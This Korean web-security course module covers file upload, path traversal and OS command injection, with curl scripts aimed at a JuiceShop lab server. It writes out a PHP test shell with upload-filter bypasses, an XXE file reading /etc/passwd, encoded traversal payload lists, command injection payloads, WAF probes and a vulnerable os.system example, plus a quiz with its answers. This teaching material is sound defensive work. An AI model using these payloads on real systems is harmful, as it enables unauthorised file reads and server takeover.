# Week 07: 입력값 검증 (3): 파일 업로드 / 경로 순회 / 명령어 주입

## 학습 목표
- 파일 업로드 취약점의 유형과 위험을 이해한다
- 경로 순회(Path Traversal) 공격을 실습하고 점검한다
- OS 명령어 주입(Command Injection)의 원리를 이해하고 탐지한다
- JuiceShop에서 각 취약점을 실습한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |

---

# Week 07: 입력값 검증 (3): 파일 업로드 / 경로 순회 / 명령어 주입

## 학습 목표
- 파일 업로드 취약점의 유형과 위험을 이해한다
- 경로 순회(Path Traversal) 공격을 실습하고 점검한다
- OS 명령어 주입(Command Injection)의 원리를 이해하고 탐지한다
- JuiceShop에서 각 취약점을 실습한다

## 전제 조건
- curl 파일 업로드 (Week 02)
- 리눅스 기본 명령어 (ls, cat, id)

---

## 1. 파일 업로드 취약점 (40분)

### 1.1 위험성

파일 업로드 취약점은 공격자가 악성 파일을 서버에 업로드하여 **원격 코드 실행(RCE)**을 달성하는 심각한 취약점이다.

| 시나리오 | 설명 |
|---------|------|
| 웹셸 업로드 | .php/.jsp 파일 업로드 → 서버에서 실행 |
| 악성 HTML 업로드 | XSS 포함 HTML → 다른 사용자에게 전달 |
| 대용량 파일 | 서비스 거부(DoS) |
| 실행 파일 | .exe/.sh 배포 |

### 1.2 점검 항목

| 점검 항목 | 확인 사항 |
|----------|----------|
| 확장자 필터링 | .php, .jsp, .exe 등 차단 여부 |
| MIME 타입 검증 | Content-Type 검증 여부 |
| 파일 내용 검증 | 매직 바이트 확인 여부 |
| 저장 경로 | 웹 루트 외부 저장 여부 |
| 파일 실행 방지 | 업로드 디렉터리 실행 권한 |
| 파일 크기 제한 | 최대 크기 설정 여부 |

### 1.3 JuiceShop 파일 업로드 테스트

> **실습 목적**: 파일 업로드, 경로 순회, 명령어 주입 취약점을 점검한다
>
> **배우는 것**: 파일 확장자/MIME 검증 우회, ../ 경로 조작, OS 명령어 삽입 기법을 이해하고 점검한다
>
> **결과 해석**: 웹쉘 업로드 성공, 시스템 파일 읽기, 명령어 실행이 되면 서버 장악으로 이어지는 심각한 취약점이다
>
> **실전 활용**: 파일 업로드 취약점은 웹쉘을 통한 서버 장악의 직접적 경로이므로 CRITICAL로 분류된다

```bash
# 로그인
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)

# 정상 파일 업로드 (이미지)
echo -e '\x89PNG\r\n\x1a\n' > /tmp/test.png
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/test.png" | python3 -m json.tool 2>/dev/null
echo ""

# 위험한 확장자 업로드 시도 (.php)
echo '<?php echo "hacked"; ?>' > /tmp/shell.php
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/shell.php" | python3 -m json.tool 2>/dev/null
echo ""

# 이중 확장자 우회 시도
cp /tmp/shell.php /tmp/shell.php.png                   # 파일 복사
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/shell.php.png" | python3 -m json.tool 2>/dev/null
echo ""

# MIME 타입 위조 시도
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/shell.php;type=image/png" | python3 -m json.tool 2>/dev/null
```

### 1.4 JuiceShop 불만 접수 파일 업로드

```bash
# Complaint(불만) 기능의 파일 업로드
# PDF만 허용하는지, 다른 형식도 가능한지 테스트

# 정상: PDF 파일
echo "%PDF-1.4 fake pdf" > /tmp/complaint.pdf
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/complaint.pdf" | python3 -m json.tool 2>/dev/null
echo ""

# 비정상: XML 파일 (XXE 가능성)
cat > /tmp/xxe.xml << 'XMLEOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
XMLEOF

curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/xxe.xml" | python3 -m json.tool 2>/dev/null
echo ""

# 대용량 파일 업로드 (크기 제한 테스트)
dd if=/dev/zero of=/tmp/bigfile.pdf bs=1M count=10 2>/dev/null
curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/bigfile.pdf" | python3 -m json.tool 2>/dev/null
rm -f /tmp/bigfile.pdf                                 # 파일 삭제
```

### 1.5 업로드된 파일 접근 확인

반복문으로 여러 대상에 대해 일괄 작업을 수행합니다.

```bash
# 업로드된 파일이 웹에서 직접 접근 가능한지 확인
for dir in "uploads" "file-upload" "assets/public/images/uploads" "ftp"; do  # 반복문 시작
  code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.30.80:3000/$dir/")
  echo "[$code] /$dir/"
done
```

---

## 2. 경로 순회 (Path Traversal) (30분)

> **이 실습을 왜 하는가?**
> "입력값 검증 (3): 파일 업로드 / 경로 순회 / 명령어 주입" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 웹 취약점 점검 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 원리

경로 순회는 `../`를 이용하여 허용된 디렉터리 밖의 파일을 읽는 공격이다.

```
정상 요청: /ftp/legal.md → /app/ftp/legal.md
공격 요청: /ftp/../../etc/passwd → /etc/passwd
```

### 2.2 JuiceShop FTP 경로 순회

```bash
# JuiceShop /ftp 디렉터리의 정상 파일
curl -s http://10.20.30.80:3000/ftp/legal.md | head -5  # silent 모드
echo ""

# 경로 순회 시도 (기본)
curl -s http://10.20.30.80:3000/ftp/../../../etc/passwd | head -5  # silent 모드
echo ""

# URL 인코딩 우회
# ../ → %2e%2e%2f
curl -s "http://10.20.30.80:3000/ftp/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | head -5  # silent 모드
echo ""

# 이중 URL 인코딩 우회
# %2e → %252e
curl -s "http://10.20.30.80:3000/ftp/%252e%252e/%252e%252e/%252e%252e/etc/passwd" | head -5  # silent 모드
echo ""

# Null byte 주입 (%00) - 오래된 시스템에서 동작
curl -s "http://10.20.30.80:3000/ftp/../../etc/passwd%00.md" | head -5  # silent 모드
echo ""

# 다양한 경로 순회 페이로드
PAYLOADS=(
  "../../../etc/passwd"
  "..%2f..%2f..%2fetc/passwd"
  "..%252f..%252f..%252fetc/passwd"
  "....//....//....//etc/passwd"
  "..%c0%af..%c0%af..%c0%afetc/passwd"
)

for payload in "${PAYLOADS[@]}"; do                    # 반복문 시작
  result=$(curl -s "http://10.20.30.80:3000/ftp/$payload" | head -1)
  if echo "$result" | grep -q "root:"; then
    echo "[성공] $payload"
  else
    echo "[실패] $payload → ${result:0:50}"
  fi
done
```

### 2.3 JuiceShop의 Poison Null Byte 챌린지

```bash
# JuiceShop은 Null Byte(%00)를 이용한 경로 순회 챌린지가 있음
# /ftp에서 .md와 .pdf 외의 파일 다운로드 시도

# 먼저 /ftp의 파일 목록 확인
curl -s http://10.20.30.80:3000/ftp/ | python3 -m json.tool 2>/dev/null

# .bak 파일 다운로드 시도 (직접)
curl -s http://10.20.30.80:3000/ftp/package.json.bak -o /dev/null -w "%{http_code}"
echo ""

# Null byte를 이용한 우회
curl -s "http://10.20.30.80:3000/ftp/package.json.bak%2500.md" | head -10
# %25 = %, %00 = null → 서버에서 .md 확장자 체크를 통과하지만
# 파일시스템에서는 null 이후를 무시하여 .bak 파일을 읽음
```

---

## 3. OS 명령어 주입 (Command Injection) (30분)

### 3.1 원리

사용자 입력이 OS 명령어에 직접 삽입되어 임의의 명령이 실행되는 취약점이다.

```python
# 취약한 코드 예시
import os
filename = request.form['filename']
os.system(f"cat /uploads/{filename}")  # 위험!

# 공격: filename = "test; id; cat /etc/passwd"
# 실행: cat /uploads/test; id; cat /etc/passwd
```

### 3.2 명령어 주입 연산자

| 연산자 | 설명 | 예시 |
|--------|------|------|
| `;` | 명령 구분 | `ping; id` |
| `&&` | AND (이전 성공 시) | `ping && id` |
| `\|\|` | OR (이전 실패 시) | `ping \|\| id` |
| `\|` | 파이프 | `ping \| id` |
| `` ` `` | 백틱 (명령 치환) | `` ping `id` `` |
| `$()` | 명령 치환 | `ping $(id)` |
| `\n` | 줄바꿈 | `ping%0aid` |

### 3.3 JuiceShop에서 명령어 주입 탐색

```bash
# JuiceShop의 API 중 시스템 명령을 실행할 수 있는 곳 탐색
# 비디오 자막, 이미지 처리 등의 기능이 OS 명령을 사용할 수 있음

# 1. B2B 주문 기능 (XML/파일 처리)
curl -s -X POST http://10.20.30.80:3000/b2b/v2/orders \
  -H "Content-Type: application/xml" \
  -H "Authorization: Bearer $TOKEN" \
  -d '<?xml version="1.0"?>                            # 요청 데이터(body)
<order>
  <productId>1</productId>
  <quantity>1; id</quantity>
</order>' | head -10
echo ""

# 2. 프로필 이미지 URL 처리
curl -s -X POST http://10.20.30.80:3000/profile/image/url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"imageUrl":"http://localhost; id"}' | head -10  # 요청 데이터(body)
echo ""

# 3. 검색 기능에서 시도
curl -s "http://10.20.30.80:3000/rest/products/search?q=test;id" | head -5  # silent 모드
```

### 3.4 다양한 페이로드 테스트

```bash
# 명령어 주입 탐지용 페이로드 모음
# 실제 시스템 명령이 실행되는지 응답 시간/내용으로 판단

CMDI_PAYLOADS=(
  "; id"
  "| id"
  "|| id"
  "&& id"
  "; sleep 3"
  "| sleep 3"
  "\$(id)"
  "\`id\`"
)

echo "=== 검색 API에서 Command Injection 테스트 ==="
for payload in "${CMDI_PAYLOADS[@]}"; do               # 반복문 시작
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('test${payload}'))")
  start=$(date +%s%N)
  result=$(curl -s --max-time 5 "http://10.20.30.80:3000/rest/products/search?q=$encoded" | head -1)
  end=$(date +%s%N)
  elapsed=$(( (end - start) / 1000000 ))
  echo "[$elapsed ms] Payload: test$payload → ${result:0:60}"
done
```

### 3.5 Time-based 명령어 주입 탐지

```bash
# sleep 명령으로 시간 기반 탐지
echo "=== Time-based Detection ==="

echo "정상 요청:"
time curl -s -o /dev/null "http://10.20.30.80:3000/rest/products/search?q=apple" 2>&1 | grep real

echo "sleep 주입:"
time curl -s -o /dev/null --max-time 10 "http://10.20.30.80:3000/rest/products/search?q=apple;sleep+3" 2>&1 | grep real

# 응답 시간이 3초 이상 차이나면 명령어 주입 가능
```

---

## 4. Apache + ModSecurity에서 점검 (20분)

### 4.1 WAF 우회 테스트

```bash
# Apache(포트 80)에 ModSecurity가 설정되어 있는지 확인
# SQLi 페이로드로 WAF 동작 확인
curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:80/?id=1'+OR+1=1--"
echo " (SQLi 차단 여부)"

# XSS 페이로드
curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:80/?q=<script>alert(1)</script>"
echo " (XSS 차단 여부)"

# 경로 순회
curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:80/../../etc/passwd"
echo " (Path Traversal 차단 여부)"

# 명령어 주입
curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:80/?cmd=;id"
echo " (Command Injection 차단 여부)"

# 403이면 WAF가 차단한 것, 200이면 통과
```

### 4.2 WAF vs JuiceShop 비교

```bash
echo "=== WAF 보호 비교 ==="
echo ""
echo "JuiceShop (포트 3000, WAF 없음):"
curl -s -o /dev/null -w "  SQLi: %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q='+OR+1=1--"  # silent 모드
curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>"  # silent 모드

echo ""
echo "Apache (포트 80, ModSecurity):"
curl -s -o /dev/null -w "  SQLi: %{http_code}\n" "http://10.20.30.80:80/?q='+OR+1=1--"  # silent 모드
curl -s -o /dev/null -w "  XSS: %{http_code}\n" "http://10.20.30.80:80/?q=<script>alert(1)</script>"  # silent 모드
```

---

## 5. 실습 과제

### 과제 1: 파일 업로드 점검
1. JuiceShop에 다양한 파일 형식(.php, .html, .exe, .pdf, .xml)을 업로드 시도하라
2. 허용/거부된 확장자를 표로 정리하라
3. MIME 타입 위조로 필터링을 우회할 수 있는지 테스트하라

### 과제 2: 경로 순회 점검
1. JuiceShop의 /ftp 기능에서 경로 순회를 시도하라
2. 최소 3가지 다른 인코딩 방식으로 우회를 시도하라
3. 성공/실패한 페이로드를 기록하고 필터링 방식을 추론하라

### 과제 3: 종합 입력값 검증 보고서
1. Week 05~07에서 실습한 모든 입력값 취약점(SQLi, XSS, CSRF, 파일 업로드, 경로 순회, 명령어 주입)을 정리하라
2. 각 취약점의 발견 여부, 위험도, 권고 사항을 보고서로 작성하라

---

## 6. 요약

| 취약점 | 공격 방법 | 영향 | 방어 |
|--------|----------|------|------|
| 파일 업로드 | 악성 파일 업로드 | RCE, XSS | 확장자+내용 검증, 실행 방지 |
| 경로 순회 | ../ 삽입 | 파일 읽기/쓰기 | 경로 정규화, 화이트리스트 |
| 명령어 주입 | ;, |, $() 삽입 | RCE | 입력 검증, subprocess 사용 |

**다음 주 예고**: Week 08 - 중간고사: JuiceShop 종합 점검 보고서를 작성한다.

---

---

## 자가 점검 퀴즈 (5문항)

이번 주차의 핵심 기술 내용을 점검한다.

**Q1.** CVSS 9.8은 어떤 심각도 등급인가?
- (a) High  (b) **Critical**  (c) Medium  (d) Low

**Q2.** 취약점 점검 시 가장 먼저 수행하는 단계는?
- (a) 익스플로잇 실행  (b) **대상 범위 확인 및 정보 수집**  (c) 보고서 작성  (d) 패치 적용

**Q3.** SQLi 취약점의 CWE 번호는?
- (a) CWE-79  (b) **CWE-89**  (c) CWE-352  (d) CWE-22

**Q4.** 점검 보고서에서 취약점의 '재현 절차'가 중요한 이유는?
- (a) 분량을 늘리기 위해  (b) **고객이 직접 확인하고 수정할 수 있도록**  (c) 법적 요건  (d) 점검 시간 기록

**Q5.** WAF(:8082)가 SQLi를 차단할 때 반환하는 HTTP 코드는?
- (a) 200 OK  (b) **403 Forbidden**  (c) 500 Internal Error  (d) 301 Redirect

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b

---
---

> **실습 환경 검증 완료** (2026-03-28): nmap/nikto, SQLi/IDOR/swagger.json, CVSS, 보고서 작성
